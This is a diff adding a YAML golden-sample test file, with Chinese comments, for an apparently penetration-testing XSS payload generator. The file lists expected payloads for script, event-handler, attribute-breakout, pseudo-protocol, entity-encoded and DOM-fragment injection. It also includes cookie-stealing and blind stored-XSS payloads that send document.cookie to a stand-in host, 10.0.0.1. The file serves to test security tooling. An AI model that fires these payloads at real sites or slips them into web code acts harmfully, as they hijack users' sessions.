@@ -1,0 +1,321 @@
+# 跨站脚本黄金样本（跨站脚本）。
+#
+# 期望值全部**照着 body 手推**：槽位默认值代入 → 变量替换 → 没有绕过、没有
+# 传输编码，所以 raw 就是代入后的原串。这批载荷里没有会走编码层的东西，
+# 每一步都能在纸面上核出来——所以逐字节断言是划算的。
+#
+# 覆盖：基础探测 / 标签+事件 / 自闭合斜杠 / 属性内事件 / 伪协议 /
+#       闭合已有标签 / 实体编码 / 窃取 Cookie / 盲打 / DOM 型。
+# 每条模板至少一条样本；槽位有多个取值的，另补一条切到非默认值的，
+# 免得哪天默认值改了、模板和样本一起错还看不出来。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= 基础探测 =================
+
+  - name: XSS 反射探针（特殊字符）
+    state:
+      vuln: xss
+      template: xss.generic.probe.reflect
+      outputs: [raw]
+    expect:
+      # 无槽位无变量，body 原样输出
+      payload: |-
+        xss'"<>
+
+  - name: XSS 基础 script 标签（默认 alert(1)）
+    state:
+      vuln: xss
+      template: xss.generic.probe.script
+      outputs: [raw]
+    expect:
+      # <script> + <<js>> 默认值 alert(1) + </script>
+      payload: "<script>alert(1)</script>"
+
+  - name: XSS 基础 script 标签（改读 Cookie）
+    state:
+      vuln: xss
+      template: xss.generic.probe.script
+      slots: {js: "alert(document.cookie)"}
+      outputs: [raw]
+    expect:
+      payload: "<script>alert(document.cookie)</script>"
+
+  - name: XSS 基础 script 标签（走 curl 渲染层）
+    state:
+      vuln: xss
+      template: xss.generic.probe.script
+      outputs: [raw, curl]
+    expect:
+      payload: "<script>alert(1)</script>"
+      # submit 默认 query：<script>alert(1)</script> 整体 URL 编码后拼在
+      # http://example.com/?id= 后面，再由 shell_quote 用单引号包起来
+      outputs:
+        curl: "curl 'http://example.com/?id=%3Cscript%3Ealert%281%29%3C%2Fscript%3E'"
+
+  - name: XSS 闭合属性引号（默认双引号+尖括号）
+    state:
+      vuln: xss
+      template: xss.generic.probe.quote
+      outputs: [raw]
+    expect:
+      # close 默认 '">'：闭合属性值 + 结束当前标签，再接 script
+      payload: |-
+        "><script>alert(1)</script>
+
+  - name: XSS 闭合属性引号（单引号）
+    state:
+      vuln: xss
+      template: xss.generic.probe.quote
+      slots: {close: "'>"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        '><script>alert(1)</script>
+
+  # ================= 标签 + 事件 =================
+
+  - name: XSS 标签携带事件（默认 img onerror）
+    state:
+      vuln: xss
+      template: xss.generic.probe.tag
+      outputs: [raw]
+    expect:
+      # <<tag.head>> = "<img src=x onerror=" ，<<tag.tail>> = ">"
+      payload: "<img src=x onerror=alert(1)>"
+
+  - name: XSS 标签携带事件（svg onload + 读域名）
+    state:
+      vuln: xss
+      template: xss.generic.probe.tag
+      slots: {tag: svg, js: "alert(document.domain)"}
+      outputs: [raw]
+    expect:
+      payload: "<svg onload=alert(document.domain)>"
+
+  - name: XSS 标签携带事件（details ontoggle）
+    state:
+      vuln: xss
+      template: xss.generic.probe.tag
+      slots: {tag: details}
+      outputs: [raw]
+    expect:
+      # details 必须带 open 才会触发 ontoggle，所以 open 写在 head 里
+      payload: "<details open ontoggle=alert(1)>"
+
+  - name: XSS 标签携带事件（video + source）
+    state:
+      vuln: xss
+      template: xss.generic.probe.tag
+      slots: {tag: source}
+      outputs: [raw]
+    expect:
+      # head 本身就是一个未闭合的 video 标签：<video><source src=x onerror=
+      # src=x 是必须的——没有它 source 就没有会加载失败的资源，onerror 未必触发
+      payload: "<video><source src=x onerror=alert(1)>"
+
+  - name: XSS 自闭合斜杠（默认 svg）
+    state:
+      vuln: xss
+      template: xss.generic.probe.slash
+      outputs: [raw]
+    expect:
+      # <<tag.head>> + "/" + <<tag.event>> + "=" + <<js>> + <<tag.tail>>
+      payload: "<svg/onload=alert(1)>"
+
+  - name: XSS 自闭合斜杠（body）
+    state:
+      vuln: xss
+      template: xss.generic.probe.slash
+      slots: {tag: body}
+      outputs: [raw]
+    expect:
+      payload: "<body/onload=alert(1)>"
+
+  - name: XSS 属性内事件（默认双引号 + onmouseover）
+    state:
+      vuln: xss
+      template: xss.generic.probe.attr
+      outputs: [raw]
+    expect:
+      # 结尾的 x= 和同种引号是为了把原标签剩下的属性关回字符串里
+      payload: |-
+        " onmouseover=alert(1) x="
+
+  - name: XSS 属性内事件（单引号 + onclick）
+    state:
+      vuln: xss
+      template: xss.generic.probe.attr
+      slots: {close: "'", event: onclick}
+      outputs: [raw]
+    expect:
+      payload: |-
+        ' onclick=alert(1) x='
+
+  # ================= 伪协议 =================
+
+  - name: XSS javascript 伪协议
+    state:
+      vuln: xss
+      template: xss.generic.scheme.javascript
+      outputs: [raw]
+    expect:
+      payload: "javascript:alert(1)"
+
+  - name: XSS data 伪协议（Base64 携带 script）
+    state:
+      vuln: xss
+      template: xss.generic.scheme.data
+      # 填进去的 b64 是 <script>alert(1)</script> 的标准 Base64，解码核对过
+      vars: {b64: "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="}
+      outputs: [raw]
+    expect:
+      payload: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+
+  # ================= 闭合已有标签 =================
+
+  - name: XSS 闭合 script 块（默认）
+    state:
+      vuln: xss
+      template: xss.generic.break.tag
+      outputs: [raw]
+    expect:
+      payload: "</script><script>alert(1)</script>"
+
+  - name: XSS 闭合 textarea
+    state:
+      vuln: xss
+      template: xss.generic.break.tag
+      slots: {ctx: textarea}
+      outputs: [raw]
+    expect:
+      payload: "</textarea><script>alert(1)</script>"
+
+  - name: XSS 闭合 title
+    state:
+      vuln: xss
+      template: xss.generic.break.tag
+      slots: {ctx: title}
+      outputs: [raw]
+    expect:
+      payload: "</title><script>alert(1)</script>"
+
+  - name: XSS 闭合 style 块
+    state:
+      vuln: xss
+      template: xss.generic.break.tag
+      slots: {ctx: style}
+      outputs: [raw]
+    expect:
+      payload: "</style><script>alert(1)</script>"
+
+  - name: XSS 闭合 JS 模板字面量
+    state:
+      vuln: xss
+      template: xss.generic.break.template
+      outputs: [raw]
+    expect:
+      # body 是 "${<<js>>}"，代入后就是一个模板串插值
+      payload: "${alert(1)}"
+
+  # ================= 实体编码 =================
+
+  - name: XSS 实体编码（默认十六进制）
+    state:
+      vuln: xss
+      template: xss.generic.entity.encode
+      outputs: [raw]
+    expect:
+      # <<enc.lt>>=&#x3c; <<enc.gt>>=&#x3e;，两对夹住 script 与 /script
+      payload: "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;"
+
+  - name: XSS 实体编码（十进制）
+    state:
+      vuln: xss
+      template: xss.generic.entity.encode
+      slots: {enc: dec}
+      outputs: [raw]
+    expect:
+      payload: "&#60;script&#62;alert(1)&#60;/script&#62;"
+
+  - name: XSS 实体编码（命名实体）
+    state:
+      vuln: xss
+      template: xss.generic.entity.encode
+      slots: {enc: named}
+      outputs: [raw]
+    expect:
+      payload: "&lt;script&gt;alert(1)&lt;/script&gt;"
+
+  # ================= 窃取 Cookie =================
+
+  - name: XSS 窃取 Cookie（Image 对象）
+    state:
+      vuln: xss
+      template: xss.generic.cookie.image
+      vars: {lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      # 变量替换把 <<lhost>> 换成 10.0.0.1，引号是模板里写死的单引号
+      payload: "<script>new Image().src='http://10.0.0.1/?c='+document.cookie</script>"
+
+  - name: XSS 窃取 Cookie（fetch）
+    state:
+      vuln: xss
+      template: xss.generic.cookie.fetch
+      vars: {lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      payload: "<script>fetch('http://10.0.0.1/?c='+document.cookie)</script>"
+
+  - name: XSS 窃取 Cookie（Base64 编码）
+    state:
+      vuln: xss
+      template: xss.generic.cookie.btoa
+      vars: {lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      payload: "<script>new Image().src='http://10.0.0.1/?c='+btoa(document.cookie)</script>"
+
+  # ================= 盲打（存储型） =================
+
+  - name: XSS 盲打探针（只证明执行）
+    state:
+      vuln: xss
+      template: xss.generic.blind.beacon
+      vars: {lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      payload: "<script>new Image().src='http://10.0.0.1/?x=1'</script>"
+
+  - name: XSS 盲打窃取 Cookie
+    state:
+      vuln: xss
+      template: xss.generic.blind.stored
+      vars: {lhost: "10.0.0.1"}
+      outputs: [raw]
+    expect:
+      payload: "<script>new Image().src='http://10.0.0.1/?c='+document.cookie</script>"
+
+  # ================= DOM 型 =================
+
+  - name: XSS DOM 型 fragment（默认 img）
+    state:
+      vuln: xss
+      template: xss.generic.dom.fragment
+      outputs: [raw]
+    expect:
+      # body 以 # 开头（fragment 不发给服务端），后面与 probe.tag 同构
+      payload: |-
+        #<img src=x onerror=alert(1)>
+
+  - name: XSS DOM 型 fragment（svg + 读域名）
+    state:
+      vuln: xss
+      template: xss.generic.dom.fragment
+      slots: {tag: svg, js: "alert(document.domain)"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        #<svg onload=alert(document.domain)>
